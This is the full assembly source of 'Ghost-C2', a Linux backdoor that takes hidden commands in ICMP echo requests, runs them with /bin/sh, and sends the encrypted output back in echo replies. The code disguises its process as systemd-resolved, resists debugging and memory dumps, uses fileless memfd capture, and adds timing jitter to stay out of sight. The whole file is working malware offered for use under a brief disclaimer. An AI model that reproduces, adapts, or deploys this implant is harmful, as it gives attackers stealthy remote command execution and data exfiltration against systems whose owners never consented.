; ===================================================================================
;  ________  ___  ___  ________  ________  _________        ________  ________     
; |\   ____\|\  \|\  \|\   __  \|\   ____\|\___   ___\     |\   ____\|\_____  \    
; \ \  \___| \ \  \\\  \ \  \|\  \ \  \___|\|___ \  \_|     \ \  \___|\|____|\  \   
;  \ \  \  __ \ \   __  \ \  \\\  \ \_____  \   \ \  \       \ \  \     ____\_\  \  
;   \ \  \|\  \ \  \ \  \ \  \\\  \|____|\  \   \ \  \       \ \  \___|\____ \  \ 
;    \ \_______\ \__\ \__\ \_______\____\_\  \   \ \__\       \ \______\\_________\
;     \|_______|\|__|\|__|\|_______|\_________\   \|__|        \|______\|_________|
;                                   \|_________|                                   
; ===================================================================================
; Project      : Ghost-C2 (v3.0.2) - "The Invisible ICMP Phantom"
; Author       : JM00NJ (https://github.com/JM00NJ) / https://netacoding.com/
; Architecture : x86_64 Linux (Pure Assembly, Libc-free)
; -----------------------------------------------------------------------------------
; Features:
;   - Transport: ICMP Stealth Channel (Asymmetric ID+SEQ Auth: 45k/55k Sum)
;   - Security: Rolling XOR Encryption (Dynamic Entropy)
;   - Stealth: Fileless Execution (memfd_create) & Process Masquerading
;   - Anti-Analysis: ptrace(PTRACE_TRACEME) & prctl(PR_SET_DUMPABLE)
;   - AND MORE : Adaptive Jitter, RDTSC Mimicry, and Syscall Obfuscation.
; -----------------------------------------------------------------------------------
; Disclaimer: This tool is developed for educational and authorized penetration 
; testing purposes only. The author is not responsible for any misuse.
; -----------------------------------------------------------------------------------
; Build: nasm -f elf64 sniff.asm -o sniff.o && ld sniff.o -o systemd-resolved
; ===================================================================================


section .bss
    fd_no resb 4                ; Socket file descriptor
    sniffed_data resb 1200      ; Buffer for received raw ICMP packets
    incoming_addr resb 16       ; Struct for sender's IP/Port (sockaddr_in)
    addr_len      resd 1        ; Size of sockaddr_in (16 bytes)
    addr_ip resb 16             ; Buffer for formatted string IP address
    full_response resb 16384    ; 16KB Buffer for total command output

section .data
    fake_name db "systemd-"
    fake_name_1 db "resolved",0
    ; --- JITTER / TIMING PARAMETERS ---
    delay_req:
        dq 0                ; Seconds (tv_sec)
        dq 600000000        ; Nano seconds (tv_nsec) - Base 600ms / set to 600 ms or 900 ms at least
    delay_rem:
        dq 0                ; Remaining time if interrupted
        dq 0
    dir db '',0             ; Filename for memfd (Anonymous RAM file)
    
    ; --- [MIMICRY UPDATE] UPDATED PACKET ARCHITECTURE ---
    icmp_packet:
        type db 0               ; ICMP Type 0 (Echo Reply)
        code db 0               
        checksum dw 0           ; Checksum placeholder
        identifier dw 0    ; Packet Identifier
        sequence dw 0  ; Magic Sequence for filtering
        ; --- MIMICRY PADDING (24 BYTES) ---
        mimicry_ts dq 0         ; 8-byte Dynamic Timestamp (RDTSC)
        mimicry_seq db 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17
                    db 0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F
        ; -------------------------------------
        payload times 56 db 0 ; Command output payload (56 bytes chunk)
        payload_len equ $ - payload 
    
    newline db 10               ; ASCII \n
    forip db 4                  ; Legacy variable
    space_char db 32            ; ASCII Space
    str_sh db '/bin/sh', 0      ; Path to shell
    str_flag db '-c', 0         ; Command flag
    argv_array:
        dq str_sh               ; Arg0: /bin/sh
        dq str_flag             ; Arg1: -c
        dq 0                    ; Arg2: Pointer to decrypted command string
        dq 0                    ; NULL terminator for argv

section .text
global _start

; --- ENTRY POINT & DAEMONIZATION ---
_start:
    call _htop_masquerade
    call _disable_memory_dump
	call _anti_debugging
	
    mov rax,[fake_name]
    mov rdi,[rsp+8]
    mov [rdi],rax
    mov rax,[fake_name_1]
    mov [rdi+8],rax
    xor rax, rax              ; rax'i tamamen sıfırla
    mov [rdi + 16], rax       ; 16. bayttan itibaren 8 baytı (16-24) komple NULL yap!
    ; Step 1: Fork to background
    mov rax, 57                 ; sys_fork
    syscall
    cmp rax, 0                  
    jne _exit                   ; Parent exits
    
    ; Step 2: Create a new session
    mov rax, 112                ; sys_setsid
    syscall

    ; Step 3: Create Raw ICMP Socket
    mov rax, 40
    add rax, 1                 ; sys_socket
    mov rdi, 2                  ; AF_INET
    mov rsi, 3                  ; SOCK_RAW
    mov rdx, 1                  ; IPPROTO_ICMP
    syscall                     
    mov [fd_no], eax            

_sniff:
    ; Initialize sockaddr parameters for recvfrom
    mov dword [addr_len], 16    
    mov r8, incoming_addr       
    mov r9, addr_len            
    xor r10, r10                

    ; Clear receive buffer (Zero-out)
    lea rdi, [sniffed_data]    
    xor al, al                  
    mov rcx, 1200               
    rep stosb                   

    ; Listen for ICMP Packets
    mov rax, 45                 ; sys_recvfrom
    mov edi, [fd_no]            
    mov rsi, sniffed_data       
    mov rdx, 1200               
    syscall

    ; Filter for ICMP Echo Requests (Type 8)
    cmp byte [sniffed_data + 20], 8 
    jne _sniff                      

    ; Error handling
    cmp rax, 0                  
    jl _error                   
    je _exit                    

    ; --- [MIMICRY UPDATE] SIZE VALIDATION ---
    ; Expected: IP(20) + ICMP(8) + Mimicry(24) = 52 Bytes
    cmp rax, 52                 
    jb _sniff                   

    push rax
    push rdx
; --- MAGIC SEQUENCE VERIFICATION (MASTER KEY) ---
    movzx eax, word [sniffed_data + 26] ; Extract Sequence
    xchg al, ah                         ; Endianness correction
    movzx edx, word [sniffed_data + 24] ; Extract Identifier
    xchg dl, dh                         ; Endianness correction
    
    add eax, edx                        ; EAX = SEQ + ID
    cmp eax, 45000                        ; Verify Master's key total (45000)
    
    pop rdx                             ; Restore saved RDX
    pop rax                             ; Restore saved RAX (Packet size)
    
    jne _sniff                          ; Ignore packet if validation fails                    


    ; --- [MIMICRY UPDATE] DECRYPTION & OFFSET HANDLING ---

    mov r14, rax
    sub r14, 52                     ; Strip IP, ICMP Header and Mimicry Padding
    lea rsi, [sniffed_data + 52]    ; Start reading from offset 52 (Secret data)
    mov rcx, r14
    call _xor_cipher                ; Decrypt the command string
    
    mov [argv_array + 16], rsi      ; Inject decrypted command into argv_array

    mov rdx, r14                     
    push rdx                        ; Save length for write syscall
    push rsi                        ; Save address for logging

    ; --- IP ADDRESS TO STRING CONVERSION ---
    xor rdx, rdx                     
    xor rbx, rbx                     
    mov rcx, 7                       ; IP raw byte offset
    mov rdi, 15                      ; String buffer offset
_loopforip:
    mov bl, 10                       
    movzx ax, [incoming_addr + rcx]  
_divloop:
    div bl                           
    add ah, 48                       ; Convert digit to ASCII
    mov [addr_ip + rdi], ah          
    dec rdi                          
    xor ah, ah                       
    cmp al, 0                        
    jg _divloop                      
    cmp rcx, 4                       
    je _contiune                     
    mov byte [addr_ip + rdi], 46     ; Dot (.)
_contiune:
    dec rdi                          
    dec rcx                          
    cmp rcx, 3                       
    jg _loopforip                    

    ; --- LOGGING RECEIVED PACKET ---
    mov rax, 1                       ; sys_write (Source IP)
    mov rdi, 1                       
    mov rdx, 16                      
    mov rsi, addr_ip                 
    syscall

    mov rax, 1                       ; sys_write (Space)
    mov rdi, 1                       
    mov rdx, 1                       
    mov rsi, space_char              
    syscall

    pop rsi                          ; Restore command address
    pop rdx                          ; Restore command length
    mov rax, 1                       ; sys_write (Received Command)
    mov rdi, 1                       
    syscall                          

    mov rax, 1                       ; sys_write (Newline)
    mov rdi, 1                       
    mov rsi, newline                 
    mov rdx, 1                       
    syscall

    jmp _execute_command            


; --- UTILITY: ICMP CHECKSUM CALCULATION ---
_checksum_cal:
    mov word [checksum], 0          
    xor rcx, rcx                    
    xor r13, r13                    
    xor rax, rax                    
    xor r11d, r11d                  
    ; Header(8) + Mimicry(24) = 32 Base Bytes
    mov rcx, 32                     
    add rcx, r12                    ; Add dynamic payload length
    mov r13, 0                      
    xor rbx, rbx                    
.checksum_loop:
    movzx r11d, word [icmp_packet + r13] 
    add eax, r11d                   
    add r13, 2                      
    sub rcx, 2                      
    cmp rcx, 2                      
    jge .checksum_loop              
    cmp rcx, 1                      
    je .final                       
    jmp .wrap                       
.final:
    movzx r11d, byte [icmp_packet + r13] 
    add eax, r11d                  
.wrap:
    mov ebx, eax                    
    shr ebx, 16                     ; Carry management
    and eax, 0xFFFF                
    add ax, bx                     
    adc ax, 0                      
    not ax                         ; One's complement
    mov [checksum], ax              
    ret

_wait_for_child:
    mov rax, 61                     ; sys_wait4
    mov rsi, 0                      
    mov rdx, 0                      
    mov r10, 0                      
    syscall
    ret

_error:
    mov rax, 60                     ; sys_exit
    mov rdi, 1                      
    syscall

; --- CORE EXECUTION LOGIC ---
_execute_command:
    call _memfd_create              ; Create anonymous RAM file for output capture
    push rax                        ; Save memfd FD

    mov rax, 50
    add rax, 7                     ; sys_fork
    syscall
    cmp rax, 0               
    je _execve                      ; Child process handles execution
    
    mov rdi, rax            
    call _wait_for_child            ; Parent waits for command to complete

    pop rdi                         ; Retrieve memfd FD
    call _lseek                     ; Reset file pointer to offset 0

    ; READ LOOP: Capture command output from memfd
    xor r14, r14                    ; Reset bytes read counter
_read_loop:
    mov rax, 0                      ; sys_read
    lea rsi, [full_response + r14]  
    mov rdx, 1000                   ; Read in 1000-byte chunks
    syscall
    
    test rax, rax                   ; EOF or no data
    jz _read_done                   
    add r14, rax                    ; Update total count
    cmp r14, 16384                  ; Check buffer limit
    jl _read_loop                   

_read_done:
    ; --- ENCRYPTION PHASE ---
    ;lea rsi, [full_response]
    ;mov rcx, r14                    
    ;call _xor_cipher                
    
    mov rax, 3                      ; sys_close (Close memfd)
    syscall
    
    mov r15, 0                      ; Reset chunk offset
    jmp _chunk_loop                 ; Proceed to packet fragmentation
    
_chunk_loop:
    cmp r14, 0
    jle .check_last_chunk           

    ; FRAGMENTATION: Split output into 56-byte chunks
    cmp r14, 56           
    jg .set_max_chunk               
    mov r12, r14            
    jmp .copy_data

.set_max_chunk:
    mov r12, 56

.copy_data:
    cld
    lea rdi, [icmp_packet + 32]     ; Write data after 8 (Header) + 24 (Mimicry)
    xor al, al                      
    mov rcx, 56                   
    rep stosb                       

    ; Update dynamic timestamp for stealth
    rdtsc                           
    mov [icmp_packet + 8], rax      
    call _create_seq_id

    lea rsi, [full_response + r15]
    lea rdi, [icmp_packet + 32]     ; Copy actual encrypted chunk
    mov rcx, r12
    rep movsb                       

    lea rsi, [icmp_packet + 32]
    mov rcx, r12
    call _xor_cipher
.packet_send:
    
    call _checksum_cal

    mov rax, 44                     ; sys_sendto
    mov rdi, [fd_no]                
    lea rsi, [icmp_packet]          
    lea rdx, [r12 + 32]             ; Packet size: Header(8) + Mimicry(24) + Payload(r12)
    mov r10, 0               
    lea r8, [incoming_addr]         
    mov r9, 16               
    syscall

    ; --- JITTER MECHANISM ---
    push rax                
    push rcx                
    push r11                
    push rdx                

    rdtsc                           ; Use RDTSC for random seed
    and eax, 0x0FFFFFFF
    add eax, 100000000              ; Calculate dynamic nano-sleep
    mov [delay_req + 8], rax

    mov rax, 35                     ; sys_nanosleep
    lea rdi, [delay_req]            
    lea rsi, [delay_rem]            
    syscall

    pop rdx
    pop r11                 
    pop rcx
    pop rax
    ;-----------------------

    sub r14, r12                    ; Decrease remaining bytes
    add r15, r12                    ; Advance read offset
    jmp _chunk_loop                 

.check_last_chunk:
    ; Check if an EOF packet is needed
    cmp r12,56                    
    jne _sniff                      

    ; Send 1-byte EOF packet
    mov r12, 1                      
    xor r14, r14                    
    cld
    lea rdi, [icmp_packet + 32]
    xor al, al
    mov rcx, 56
    rep stosb                       
    
    rdtsc
    mov [icmp_packet + 8], rax

    call _create_seq_id
    mov rax, 44
    mov rdi, [fd_no]
    lea rsi, [icmp_packet]
    mov rdx, 33                     ; Header(8) + Mimicry(24) + EOF(1)
    lea r8, [incoming_addr]
    mov r9, 16
    syscall
    jmp _sniff                      


_execve:
    ; Redirection: Bind stdout/stderr to memfd
    pop rdi                         ; Retrieve memfd FD from stack
    call _dup2                      

    ; Execute shell command
    mov rax, 50
    add rax, 9                     ; sys_execve
    mov rdi, str_sh                 
    mov rsi, argv_array             
    mov rdx, 0                      
    syscall

_dup2:
    mov rax, 33                     ; sys_dup2 (STDOUT)
    mov rsi, 1                      
    syscall

    mov rax, 33                     ; sys_dup2 (STDERR)
    mov rsi, 2                      
    syscall
    ret

_lseek:
    mov rax, 8                      ; sys_lseek
    mov rsi, 0                      
    mov rdx, 0                      
    syscall
    ret

_memfd_create:
	mov rax, 300
    add rax, 19                    ; sys_memfd_create
    mov rdi, dir                    
    mov rsi, 0                      
    syscall
    ret

_xor_cipher:
    test rcx, rcx                   
    jz .done                        
    push rsi                        
    push rdx                        ; DL kullanacağımız için RDX'i koruyalım
    mov dl, 0x42                    ; Başlangıç anahtarı (Seed)
.loop:
    xor byte [rsi], dl              ; Baytı mevcut anahtarla XOR'la
    add dl, 0x07                    ; Her adımda anahtarı 7 artır (Rolling etkisi)
    inc rsi                         
    loop .loop                      
    pop rdx                         
    pop rsi                         
.done:
    ret

_create_seq_id:
    ; 1. Generate a random number (1-119) for the Identifier
    rdtsc
    xor edx, edx    ; Clear EDX before division
    mov ecx, 20000
    div ecx         ; EDX now contains the remainder (0-118)
    add edx,10000         ; EDX is now a random number between 10000 and 29999 (ID)

    ; 2. Calculate the Sequence number for Asymmetric Return
    mov eax, 55000    ; Load the asymmetric return key (55000) into EAX
    sub eax, edx    ; EAX = 150 - EDX (This becomes the SEQ value)

    ; 3. Network Byte Order (Endianness) Correction
    xchg dl, dh     ; Swap lower 16 bits of EDX (DX)
    xchg al, ah     ; Swap lower 16 bits of EAX (AX)

    ; 4. Inject into the ICMP packet structure
    mov word [icmp_packet + 4], dx
    mov word [icmp_packet + 6], ax

    ret             ; Return to caller



_htop_masquerade:
    mov rax,157
    mov rdi,15
    lea rsi, [fake_name]
    syscall
    ret

_disable_memory_dump:
    mov rax,157
    mov rdi,4
    mov rsi, 0
    syscall
    ret

_anti_debugging:
	mov rax, 91
	add rax, 10						; sys_ptrace
	xor rdi,rdi						; PTRACE_TRACEME (0)
	xor rsi,rsi
	xor rdx,rdx
	xor r10,r10
	syscall
	test rax,rax
	js _exit
	ret


_exit:
    mov rax, 60                     ; sys_exit
    mov rdi, 0                      
    syscall
